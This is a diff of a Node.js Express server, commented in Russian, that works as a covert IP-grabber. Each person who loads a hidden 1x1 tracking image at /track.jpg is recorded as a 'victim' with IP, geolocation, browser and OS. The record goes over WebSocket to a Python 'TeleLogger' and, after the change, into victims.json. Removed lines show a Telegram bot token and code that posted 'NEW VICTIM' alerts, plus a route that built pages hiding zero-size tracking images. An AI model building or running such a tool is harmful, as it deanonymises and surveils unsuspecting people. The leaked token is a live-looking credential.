@@ -1,61 +1,40 @@
 const express = require('express');
 const WebSocket = require('ws');
 const http = require('http');
+const fs = require('fs');
 const axios = require('axios');
 
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Telegram конфиг
-const TELEGRAM_TOKEN = '8652352513:AAGCxb8tQydzu0WhMf1sFQXjmmBOm7zFnn0';
-const TELEGRAM_CHAT_ID = '8652352513';
-
-// Хранилище WebSocket клиентов
-const clients = new Set();
-
-// 1x1 пиксель
 const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
 
-// WebSocket соединение
+// Хранилище WebSocket клиентов (Python TeleLogger)
+const clients = new Set();
+
 wss.on('connection', (ws) => {
-    console.log('[+] Python client connected');
+    console.log('[+] Python TeleLogger connected');
     clients.add(ws);
-    
-    ws.on('close', () => {
-        clients.delete(ws);
-        console.log('[-] Python client disconnected');
-    });
+    ws.on('close', () => clients.delete(ws));
 });
 
 // Отправка данных всем клиентам
 function broadcastVictimData(data) {
-    const message = JSON.stringify(data);
     clients.forEach(client => {
         if (client.readyState === WebSocket.OPEN) {
-            client.send(message);
+            client.send(JSON.stringify(data));
         }
     });
 }
 
-// Отправка в Telegram
-async function sendToTelegram(message) {
-    try {
-        await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
-            chat_id: TELEGRAM_CHAT_ID,
-            text: message,
-            parse_mode: 'HTML'
-        });
-    } catch(e) {}
-}
-
-// Геолокация
+// Геолокация по IP
 async function getGeoLocation(ip) {
     if (ip === '127.0.0.1' || ip.startsWith('192.168') || ip.startsWith('10.')) {
         return { country: 'Local', city: 'Local', isp: 'Local Network' };
     }
     try {
-        const response = await axios.get(`http://ip-api.com/json/${ip}`);
+        const response = await axios.get(`http://ip-api.com/json/${ip}`, { timeout: 3000 });
         return response.data;
     } catch(e) {
         return { country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
@@ -67,12 +46,14 @@ function parseUserAgent(ua) {
     if (!ua) return { browser: 'Unknown', os: 'Unknown', device: 'Unknown' };
     return {
         browser: ua.includes('Firefox') ? 'Firefox' : 
-                  ua.includes('Chrome') ? 'Chrome' :
-                  ua.includes('Safari') ? 'Safari' : 'Other',
+                  ua.includes('Chrome') && !ua.includes('Edg') ? 'Chrome' :
+                  ua.includes('Safari') && !ua.includes('Chrome') ? 'Safari' :
+                  ua.includes('Edg') ? 'Edge' : 'Other',
         os: ua.includes('Windows') ? 'Windows' :
             ua.includes('Mac') ? 'macOS' :
             ua.includes('Android') ? 'Android' :
-            ua.includes('iPhone') ? 'iOS' : 'Other',
+            ua.includes('iPhone') ? 'iOS' :
+            ua.includes('Linux') ? 'Linux' : 'Other',
         device: ua.includes('Mobile') ? 'Mobile' : 'Desktop'
     };
 }
@@ -81,6 +62,7 @@ function parseUserAgent(ua) {
 app.get('/track.jpg', async (req, res) => {
     // Получаем IP
     let ip = req.headers['x-forwarded-for']?.split(',')[0] || 
+             req.headers['x-real-ip'] ||
              req.socket.remoteAddress ||
              req.ip;
     ip = ip?.replace('::ffff:', '');
@@ -102,7 +84,7 @@ app.get('/track.jpg', async (req, res) => {
     // Геолокация
     const geo = await getGeoLocation(ip);
     
-    // Формируем данные для отправки
+    // Формируем данные
     const victimData = {
         ip: ip,
         country: geo.country || 'Unknown',
@@ -121,25 +103,11 @@ app.get('/track.jpg', async (req, res) => {
         acceptLanguage: req.headers['accept-language'] || 'Unknown'
     };
     
-    // Отправляем через WebSocket Python клиенту
+    // Отправляем в WebSocket (Python клиенту)
     broadcastVictimData(victimData);
     
-    // Отправляем в Telegram
-    const telegramMsg = `
-🔍 <b>NEW VICTIM</b>
-━━━━━━━━━━━━━━━━━━━━━
-🌐 IP: <code>${ip}</code>
-📍 Location: ${geo.city}, ${geo.country}
-🏢 ISP: ${geo.isp}
-💻 Browser: ${uaInfo.browser}
-🖥️ OS: ${uaInfo.os}
-📱 Device: ${uaInfo.device}
-🌍 Source: ${website}
-⏰ Time: ${new Date().toLocaleString()}
-    `;
-    await sendToTelegram(telegramMsg);
-    
     // Сохраняем в файл
+    fs.appendFileSync('victims.json', JSON.stringify(victimData) + '\n');
     
     console.log(`[+] Victim: ${ip} | ${geo.country} | ${website}`);
     
@@ -148,26 +116,29 @@ app.get('/track.jpg', async (req, res) => {
     res.send(PIXEL);
 });
 
-// Маршрут для генерации страницы Telegraph
-app.post('/create-page', express.json(), async (req, res) => {
-    const { title, description, imageUrl } = req.body;
-    
-    // Генерируем HTML
-    const html = `
-        <h1>${title}</h1>
-        <p>${description}</p>
-        <img src="${imageUrl}" style="display:none">
-        <img src="${imageUrl}" width="0" height="0">
-    `;
-    
-    // Здесь можно создать Telegraph страницу через API
-    res.json({ success: true, html: html });
+// Прокси на Vercel JPG (опционально)
+app.get('/vercel.jpg', async (req, res) => {
+    try {
+        const vercelImage = await axios.get('https://mwr-2w7j.vercel.app/track.jpg', {
+            responseType: 'arraybuffer'
+        });
+        res.set('Content-Type', 'image/jpeg');
+        res.send(vercelImage.data);
+    } catch(e) {
+        res.status(500).send('Error');
+    }
 });
 
 server.listen(3000, '0.0.0.0', () => {
     console.log(`
-[+] Express server on http://0.0.0.0:3000
-[+] WebSocket on ws://0.0.0.0:3000
-[+] Tracking endpoint: /track.jpg
+╔═══════════════════════════════════════╗
+║     Express Tracking Server          ║
+╚═══════════════════════════════════════╝
+
+[+] Server: http://0.0.0.0:3000
+[+] WebSocket: ws://0.0.0.0:3000
+[+] Tracking endpoint: http://YOUR_IP:3000/track.jpg
+
+[!] Запустите Python TeleLogger в другом терминале
     `);
 });
